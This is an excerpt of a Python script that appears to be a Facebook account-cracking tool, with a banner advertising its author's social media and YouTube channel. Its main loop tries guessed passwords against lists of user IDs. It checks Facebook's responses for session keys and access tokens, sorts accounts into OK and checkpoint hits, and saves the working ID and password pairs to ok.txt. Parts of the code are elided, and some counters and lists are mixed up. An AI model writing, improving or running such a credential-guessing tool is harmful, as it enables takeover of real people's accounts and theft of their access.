...
\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m   
\033[1;32m║AUTHOR       : Hassan Baloch\x1b[1;91m       
\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m  
\033[1;32m║WHATSAPP : +92*************†*\x1b[1;91m     
\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m        
\033[1;32m║GITHUB         : Tech-Hassan     \x1b[1;91m    
\033[1;32m║═══════════════════════════════════════════════════════════║
\033[1;32m║SERVER      : DATA - WIFI WORKING\033[37;41mOLD PROJECT\033[0;m\033[1;32m      
\033[1;32m║═══════════════════════════════════════════════════════════║
\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://m.me/safdar.baloch.395\033[1;32m  
\033[1;32m║═══════════════════════════════════════════════════════════║
\033[1;32m║YouTube LINK  : \x1b[1;91mhttps://youtube.com/@Hassan_Baloch7108\033[1;32m    
\033[1;32m╚═══════════════════════════════════════════════════════════╝\033[1;37m""")
class Main:
	def __init__(self):
		self.id = []
		...
		if syed in ["", " "]:
			...
			os.system("xdg-open https://youtube.com/@Hassan_Baloch7108")
			print("")
			time.sleep(2.0)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[▓█►─Hassan⌐╦╦═─] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [▓█►─Hassan⌐╦╦═─_OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[91;1m   [▓█►─Hassan⌐╦╦═─_CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
